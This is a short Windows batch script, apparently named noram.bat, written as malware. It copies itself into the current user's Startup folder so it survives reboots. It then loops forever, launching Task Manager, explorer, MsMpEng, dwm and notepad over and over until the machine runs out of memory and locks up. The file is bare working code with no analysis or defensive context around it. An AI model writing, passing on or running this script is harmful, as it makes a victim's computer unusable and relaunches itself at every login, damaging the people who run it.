@echo off
copy /y "E:\noram.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
:x
start "" "Taskmgr.exe" -nogui
start "" "explorer.exe" -nogui
start "" "MsMpEng.exe" -nogui
start "" "dwm.exe" -nogui
start "" "notepad.exe" -nogui
goto x